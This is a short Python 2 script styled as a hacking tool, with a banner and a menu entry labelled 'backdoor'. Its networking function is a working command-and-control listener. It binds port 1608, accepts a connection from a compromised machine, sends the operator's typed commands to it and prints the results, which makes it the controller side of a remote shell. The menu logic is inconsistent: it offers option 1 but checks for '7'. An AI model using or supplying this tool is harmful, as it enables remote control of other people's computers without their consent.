#CODED BY SPADES
#encode ASCII
from socket import *
import os
import subprocess
import time

def main():
	print """
	\033[0;91m
      
  /$$$$$$          /$$$$$$$                               
 /$$$_  $$        | $$__  $$                              
| $$$$\ $$        | $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$ 
| $$ $$ $$ /$$$$$$| $$  | $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$\ $$$$|______/| $$  | $$| $$  \ $$| $$  \ $$| $$  \__/
| $$ \ $$$        | $$  | $$| $$  | $$| $$  | $$| $$      
|  $$$$$$/        | $$$$$$$/|  $$$$$$/|  $$$$$$/| $$      
 \______/         |_______/  \______/  \______/ |__/ \033[0;97m
===========================================================
===========================================================\033[0;92m                                                          
> 1. backdoor
===========================================================
===========================================================
"""

	opt = raw_input("\033[0;91mchoose option:")
	print "=========================================================================="
	
	if opt == "7":
		networking()
	
def networking():

	HOST = ''
	PORT = 1608

	s = socket(AF_INET, SOCK_STREAM)
	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	s.bind((HOST, PORT))

	print "{:+:} LISTENING ON 0.0.0.0:%s" % str(PORT)

	s.listen(1)

	conn, addr = s.accept()
	print "{:+:} NEW CONNECTION INCOMING FROM ==> %s:%s\033[0;91m "% (str(addr[0]), str(addr[1]) )
	print "============================================================================="

	while 1:
	
		#receive cmd info
		command = raw_input(str(addr[0] + "$: "))
		print "============================================================================\033[0;91m"
		conn.send(command)
		if command == "quit" : break
		data = conn.recv(4096)
		print "\033[0;92m" + data

os.system('cls')
main()
networking()
